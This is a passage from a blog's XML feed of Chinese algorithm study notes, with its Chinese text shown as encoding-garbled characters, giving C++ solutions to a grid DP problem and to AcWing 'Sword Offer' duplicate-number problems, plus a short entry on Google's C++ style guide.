æ¯”å½“å‰ç‚¹ä½<br>è¦å½¢æˆæ‹“æ‰‘å›¾ï¼Œä¸èƒ½å­˜åœ¨ç¯å½¢ä¾èµ–</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">310</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[kN][kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> &amp;v = f[x][y];  <span class="comment">// é™¤äº†åŠ é€Ÿå‡½æ•°å‚æ•°ä¼ é€’æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥ç¼©çŸ­ä»£ç é•¿åº¦</span></span><br><span class="line">  <span class="keyword">if</span> (v != <span class="number">-1</span>) <span class="keyword">return</span> v;</span><br><span class="line">  v = <span class="number">1</span>;  <span class="comment">// åˆå§‹åŒ–, å…¶æœ¬èº«å°±ç®—ä¸€æ­¥</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">    <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; n &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; m &amp;&amp; g[a][b] &lt; g[x][y])</span><br><span class="line">      v = <span class="built_in">max</span>(v, <span class="built_in">dp</span>(a, b) + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;g[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">-1</span>, <span class="keyword">sizeof</span> f);  <span class="comment">// åˆå§‹åŒ–, æ‰€æœ‰çŠ¶æ€æœªè¢«è®¡ç®—</span></span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">      res = <span class="built_in">max</span>(res, <span class="built_in">dp</span>(i, j));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
          <category> AcWingç®—æ³•åŸºç¡€è¯¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google C++ é£æ ¼å­¦ä¹ </title>
      <link href="/2022/11/21/%E7%AE%97%E6%B3%95-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/21/%E7%AE%97%E6%B3%95-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒã€ŠGoogle å¼€æºé¡¹ç›®é£æ ¼æŒ‡å—ã€‹<br>æå¼€å¤è¿™æ ·è¯„ä»·è¿™ä»½æŒ‡å—ï¼šâ€æˆ‘è®¤ä¸ºè¿™æ˜¯åœ°çƒä¸Šæœ€å¥½çš„ä¸€ä»½C++ç¼–ç¨‹è§„èŒƒï¼Œæ²¡æœ‰ä¹‹ä¸€ï¼Œå»ºè®®å¹¿å¤§å›½å†…å¤–ITç ”ç©¶ä½¿ç”¨ã€‚â€œ</p><span id="more"></span><h1 id="è§†é¢‘æ¨è">è§†é¢‘æ¨è</h1><p><a href="https://www.bilibili.com/video/BV1nh411o7h1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">Googleç¼–ç¨‹é£æ ¼æŒ‡å—å­¦ä¹  - ç¬¬ä¸€æœŸ</a> è§†é¢‘è´¨é‡å¾ˆé«˜ï¼Œå¯æƒœåªæœ‰ä¸€æœŸã€‚</p><p>ç²¾åå°±åœ¨ä½œè€…åšçš„è¿™å¼ è¡¨ä¸­ï¼š</p><p><img src="/2022/11/21/%E7%AE%97%E6%B3%95-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/image-20221121164530928.png" alt></p><h1 id="æ€»ç»“">æ€»ç»“</h1><p><img src="/2022/11/21/%E7%AE%97%E6%B3%95-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/google%20cpp%20style.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•é£æ ¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šå‰‘æŒ‡offerã€‹ç¬”è®°</title>
      <link href="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>AcWingç‰ˆã€Šå‰‘æŒ‡offerã€‹çš„åˆ·é¢˜ç¬”è®°ã€‚</p><span id="more"></span><h1 id="Week-1">Week 1</h1><h2 id="æ‰¾å‡ºæ•°ç»„ä¸­é‡å¤çš„æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/14/">æ‰¾å‡ºæ•°ç»„ä¸­é‡å¤çš„æ•°å­—â˜…</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°æ•°ç»„ <code>nums</code>ï¼Œæ•°ç»„ä¸­æ‰€æœ‰çš„æ•°å­—éƒ½åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„èŒƒå›´å†…ã€‚</p><p>æ•°ç»„ä¸­æŸäº›æ•°å­—æ˜¯é‡å¤çš„ï¼Œä½†ä¸çŸ¥é“æœ‰å‡ ä¸ªæ•°å­—é‡å¤äº†ï¼Œä¹Ÿä¸çŸ¥é“æ¯ä¸ªæ•°å­—é‡å¤äº†å‡ æ¬¡ã€‚</p><p>è¯·æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªé‡å¤çš„æ•°å­—ã€‚</p><p><strong>æ³¨æ„</strong>ï¼šå¦‚æœæŸäº›æ•°å­—ä¸åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„èŒƒå›´å†…ï¼Œæˆ–æ•°ç»„ä¸­ä¸åŒ…å«é‡å¤æ•°å­—ï¼Œåˆ™è¿”å› -1ï¼›</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>ç»™å®š nums = [2, 3, 5, 4, 3, 2, 6, 7]ã€‚è¿”å› 2 æˆ– 3ã€‚</code></pre><h3 id="åŸåœ°å“ˆå¸Œ-O-n">åŸåœ°å“ˆå¸Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p><strong>æ€è·¯</strong></p><p>nums[i]çš„å€¼ä¸ºnums[i], è€Œnums[nums[i]]å…ƒç´ çš„ä¸‹æ ‡ä½ç½®ä¸ºnums[i],<br>æ¯æ¬¡swapånums[i]è¢«æ”¾åˆ°ä¸‹æ ‡ä¸ºnums[i]çš„ä½ç½®å¤„(è€Œiå¤„çš„å€¼nums[i]ä¼šå˜åŒ–)ï¼Œå› æ­¤ä¸ä¼šæ­»å¾ªç¯, whileå¯ä»¥ç»“æŸ</p><p>whileç»“æŸçš„æ¡ä»¶æ˜¯: nums[i] == nums[nums[i]], è¿™æœ‰2ç§æƒ…å†µ:</p><ol><li>i == nums[i], å³æˆåŠŸæŠŠiå¤„å…ƒç´ ä¹Ÿæ”¾å¥½</li><li>i != nums[i], å³ä¸‹æ ‡ä¸ºiå’Œnums[i]çš„å€¼ç›¸ç­‰nums[i] == nums[nums[i]], ç¢°æ’å‘ç”Ÿ, è¿”å›</li></ol><p><strong>æ—¶ç©ºå¤æ‚åº¦åˆ†æ</strong></p><ul><li>æ—¶é—´å¤æ‚åº¦: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>, æ¯æ¬¡swapéƒ½ä¼šæœ‰1ä¸ªå…ƒç´ æ”¾å›åŸä½</li><li>ç©ºé—´å¤æ‚åº¦: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>, æ²¡æœ‰å¼€è¾Ÿæ–°æ•°ç»„</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">duplicateInArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt; n - <span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="keyword">while</span> (nums[i] != nums[nums[i]]) <span class="built_in">swap</span>(nums[i], nums[nums[i]]);</span><br><span class="line">      <span class="keyword">if</span> (i != nums[i]) <span class="keyword">return</span> nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é“é¢˜åœ¨åŸä¹¦ä¸Šç»å¯¹ä¸æ˜¯ç®€å•çº§åˆ«å•Šï¼<br>å®ƒè€ƒå¯Ÿçš„æ˜¯ç¨‹åºå‘˜çš„æ²Ÿé€šèƒ½åŠ›ï¼Œå…ˆé—®é¢è¯•å®˜è¦æ—¶é—´/ç©ºé—´éœ€æ±‚ï¼ï¼ï¼<br>åªæ˜¯æ—¶é—´ä¼˜å…ˆå°±ç”¨å­—å…¸ï¼Œ<br>è¿˜æœ‰ç©ºé—´è¦æ±‚ï¼Œå°±ç”¨æŒ‡é’ˆ+åŸåœ°æ’åºæ•°ç»„ï¼Œ<br>å¦‚æœé¢è¯•å®˜è¦æ±‚ç©ºé—´O(1)å¹¶ä¸”ä¸èƒ½ä¿®æ”¹åŸæ•°ç»„ï¼Œè¿˜å¾—å†™æˆäºŒåˆ†æ³•ï¼ï¼ï¼</p></blockquote><h2 id="ä¸ä¿®æ”¹æ•°ç»„æ‰¾å‡ºé‡å¤çš„æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/15/">ä¸ä¿®æ”¹æ•°ç»„æ‰¾å‡ºé‡å¤çš„æ•°å­—â˜…</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„æ•°ç»„<code>nums</code>ï¼Œæ•°ç»„ä¸­æ‰€æœ‰çš„æ•°å‡åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \sim n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„èŒƒå›´å†…ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \ge 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</p><p>è¯·æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªé‡å¤çš„æ•°ï¼Œä½†ä¸èƒ½ä¿®æ”¹è¾“å…¥çš„æ•°ç»„ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>ç»™å®š nums = [2, 3, 5, 4, 3, 2, 6, 7]ã€‚è¿”å› 2 æˆ– 3ã€‚</code></pre><p><strong>æ€è€ƒé¢˜</strong>ï¼šå¦‚æœåªèƒ½ä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> çš„é¢å¤–ç©ºé—´ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><h3 id="æŠ½å±‰åŸç†-äºŒåˆ†æ³•-O-n-cdot-logn">æŠ½å±‰åŸç† + äºŒåˆ†æ³• <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p>æŠ½å±‰åŸç†: n+1ä¸ªæ•°çš„å–å€¼èŒƒå›´ä¸º[1, n], åˆ™å¿…æœ‰è‡³å°‘2ä¸ªæ•°ç›¸åŒ</p><p>åˆ†æ²»æ€æƒ³: å°†<strong>å–å€¼èŒƒå›´</strong>æ€»åŒºé—´[1, n]æŒ‰å–å€¼èŒƒå›´åˆ†ä¸ºå·¦å³åŒºé—´, åˆ™å¿…æœ‰1ä¸ªåŒºé—´ä¸­çš„æ•°å¤§äºå‘æ•°(å–å€¼èŒƒå›´ä¸ªæ•°)</p><p>æ—¶é—´å¤æ‚åº¦: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>æ¯æ¬¡ä¼šå°†åŒºé—´é•¿åº¦ç¼©å°ä¸€åŠï¼Œä¸€å…±ä¼šç¼©å° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> æ¬¡ã€‚æ¯æ¬¡ç»Ÿè®¡ä¸¤ä¸ªå­åŒºé—´ä¸­çš„æ•°æ—¶éœ€è¦éå†æ•´ä¸ªæ•°ç»„ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ã€‚æ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">duplicateInArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// äºŒåˆ†çš„æ˜¯å–å€¼èŒƒå›´(å‘çš„èŒƒå›´)</span></span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;  <span class="comment">// nums.size() = n + 1</span></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) s += (x &gt;= l &amp;&amp; x &lt;= mid);</span><br><span class="line">      <span class="keyword">if</span> (s &gt; mid - l + <span class="number">1</span>) r = mid;</span><br><span class="line">      <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾"><a 